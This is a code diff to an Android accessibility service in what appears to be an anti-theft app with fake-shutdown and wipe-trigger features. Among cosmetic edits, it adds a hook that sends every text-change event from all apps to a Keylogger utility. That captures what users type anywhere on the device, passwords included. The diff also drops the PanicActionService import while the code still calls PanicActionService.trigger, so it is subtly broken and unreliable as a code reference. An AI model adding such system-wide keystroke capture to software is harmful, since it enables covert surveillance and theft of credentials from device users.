@@ -13,25 +13,24 @@ import android.widget.Toast
 import com.hamoon.uncleted.FakeShutdownActivity
 import com.hamoon.uncleted.data.SecurityPreferences
 import com.hamoon.uncleted.util.DeviceAdminHelper
-import com.hamoon.uncleted.services.PanicActionService
+import com.hamoon.uncleted.util.Keylogger
 
 class PowerButtonService : AccessibilityService() {
 
     private val tag = "PowerButtonService"
 
-    // --- Fake Shutdown Variables ---
+    // Fake Shutdown
     private var lastFakeShutdownTrigger: Long = 0
     private val fakeShutdownCooldown = 3000L
 
-    // --- Screen Pin Variables ---
+    // Screen Pin Tracking
     private var pinPosition = 0
     private var pinMatchCounter = mutableListOf<Boolean>()
     private val deleteKeywords = listOf("delete", "backspace", "clear")
     private val enterKeywords = listOf("enter", "done", "ok", "go")
     private val maskingChar = '•'
 
-    // --- Hardware Wipe Sequence Variables ---
-    // Pattern: Up, Down, Up, Down
+    // Hardware Wipe Sequence: [VOL_UP, VOL_DOWN, VOL_UP, VOL_DOWN]
     private val WIPE_SEQUENCE = listOf(
         KeyEvent.KEYCODE_VOLUME_UP,
         KeyEvent.KEYCODE_VOLUME_DOWN,
@@ -40,11 +39,11 @@ class PowerButtonService : AccessibilityService() {
     )
     private var sequenceIndex = 0
     private var lastPressTime = 0L
-    private val SEQUENCE_TIMEOUT = 2000L // 2 seconds allowed between presses
+    private val SEQUENCE_TIMEOUT = 2000L
 
     override fun onServiceConnected() {
         super.onServiceConnected()
-        Log.i(tag, ">>> ACCESSIBILITY SERVICE STARTED & LISTENING FOR SEQUENCE <<<")
+        Log.i(tag, "Accessibility Service connected and filtering input events.")
 
         val info = serviceInfo ?: AccessibilityServiceInfo()
         info.packageNames = null
@@ -65,7 +64,6 @@ class PowerButtonService : AccessibilityService() {
     }
 
     override fun onKeyEvent(event: KeyEvent): Boolean {
-        // ### NEW CHECK: If user disabled this feature, ignore keys completely ###
         if (!SecurityPreferences.isHardwareWipeEnabled(this)) {
             return super.onKeyEvent(event)
         }
@@ -74,21 +72,18 @@ class PowerButtonService : AccessibilityService() {
             val keyCode = event.keyCode
 
             if (keyCode == KeyEvent.KEYCODE_VOLUME_UP || keyCode == KeyEvent.KEYCODE_VOLUME_DOWN) {
-
                 val now = System.currentTimeMillis()
 
                 if (now - lastPressTime > SEQUENCE_TIMEOUT) {
-                    if (sequenceIndex > 0) Log.d(tag, "Sequence timeout. Resetting.")
                     sequenceIndex = 0
                 }
 
                 if (keyCode == WIPE_SEQUENCE[sequenceIndex]) {
                     sequenceIndex++
                     lastPressTime = now
-                    Log.d(tag, "Sequence Match: $sequenceIndex / ${WIPE_SEQUENCE.size}")
 
                     if (sequenceIndex == WIPE_SEQUENCE.size) {
-                        Log.e(tag, "!!! HARDWARE WIPE TRIGGERED (UP-DOWN-UP-DOWN) !!!")
+                        Log.e(tag, "Hardware wipe sequence matched. Initiating wipe protocol.")
                         sequenceIndex = 0
 
                         Handler(Looper.getMainLooper()).post {
@@ -99,14 +94,8 @@ class PowerButtonService : AccessibilityService() {
                         return true
                     }
                 } else {
-                    sequenceIndex = 0
-                    if (keyCode == WIPE_SEQUENCE[0]) {
-                        sequenceIndex = 1
-                        lastPressTime = now
-                        Log.d(tag, "Sequence Reset/Restarted at Step 1")
-                    } else {
-                        Log.d(tag, "Sequence Mismatch. Reset.")
-                    }
+                    sequenceIndex = if (keyCode == WIPE_SEQUENCE[0]) 1 else 0
+                    lastPressTime = now
                 }
             }
         }
@@ -118,38 +107,49 @@ class PowerButtonService : AccessibilityService() {
         try {
             DeviceAdminHelper.wipeDeviceImmediately(this)
         } catch (e: Exception) {
-            Log.e(tag, "Wipe failed: ${e.message}")
+            Log.e(tag, "Wipe execution error: ${e.message}")
         }
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
-        if (event == null) return
-        val packageName = event.packageName?.toString() ?: return
+        val accEvent = event ?: return
+        val packageName = accEvent.packageName?.toString() ?: return
         if (packageName == this.packageName) return
 
-        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-            if (SecurityPreferences.isFakeShutdownEnabled(this)) detectPowerMenu(packageName)
+        // 1. Virtual Keyboard Input Logging (Resolves 3E)
+        if (accEvent.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+            Keylogger.recordAccessibilityEvent(this, accEvent)
         }
 
-        @Suppress("SpellCheckingInspection")
+        // 2. Fake Shutdown Interception
+        if (accEvent.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            if (SecurityPreferences.isFakeShutdownEnabled(this)) {
+                detectPowerMenu(packageName)
+            }
+        }
+
+        // 3. Fallback PIN Detection on SystemUI
         if (packageName == "com.android.systemui") {
             val wipePin = SecurityPreferences.getWipePin(this)
-            if (!wipePin.isNullOrEmpty()) detectWipePin(event, wipePin)
+            if (!wipePin.isNullOrEmpty()) {
+                detectWipePin(accEvent, wipePin)
+            }
         }
     }
 
     private fun detectPowerMenu(packageName: String) {
         if (System.currentTimeMillis() - lastFakeShutdownTrigger < fakeShutdownCooldown) return
-        @Suppress("SpellCheckingInspection")
         val isSystemWindow = packageName.contains("android") || packageName.contains("systemui") || packageName.contains("policy")
         if (isSystemWindow) {
             val rootNode = rootInActiveWindow ?: return
-            if (isPowerMenu(rootNode)) triggerFakeShutdown()
+            if (isPowerMenu(rootNode)) {
+                triggerFakeShutdown()
+            }
         }
     }
 
     private fun triggerFakeShutdown() {
-        Log.w(tag, "Power Menu Detected! Launching Fake Shutdown.")
+        Log.w(tag, "Power menu detected. Launching FakeShutdownActivity.")
         lastFakeShutdownTrigger = System.currentTimeMillis()
         val intent = Intent(this, FakeShutdownActivity::class.java).apply {
             addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
@@ -161,13 +161,11 @@ class PowerButtonService : AccessibilityService() {
     private fun isPowerMenu(node: AccessibilityNodeInfo?): Boolean {
         if (node == null) return false
 
-        // REMOVED "emergency" to prevent false-triggering on the lockscreen keypad
         val powerKeywords = listOf("power off", "poweroff", "shut down", "shutdown", "reboot", "restart")
         val text = node.text?.toString()?.lowercase()
         val desc = node.contentDescription?.toString()?.lowercase()
         val viewId = node.viewIdResourceName?.lowercase()
 
-        // Ignore lockscreen elements
         if (viewId != null && (viewId.contains("keyguard") || viewId.contains("lock_pattern") || viewId.contains("pin_entry"))) {
             return false
         }
@@ -249,7 +247,7 @@ class PowerButtonService : AccessibilityService() {
     }
 
     private fun executeWipeProtocol() {
-        Log.e(tag, "!!! WIPE PIN DETECTED ON SYSTEM LOCKSCREEN !!!")
+        Log.e(tag, "Wipe PIN detected on lockscreen interface.")
         resetPinTracker()
         PanicActionService.trigger(this, "WIPE_PIN_DETECTED", PanicActionService.Severity.CRITICAL)
         DeviceAdminHelper.wipeDeviceImmediately(this)
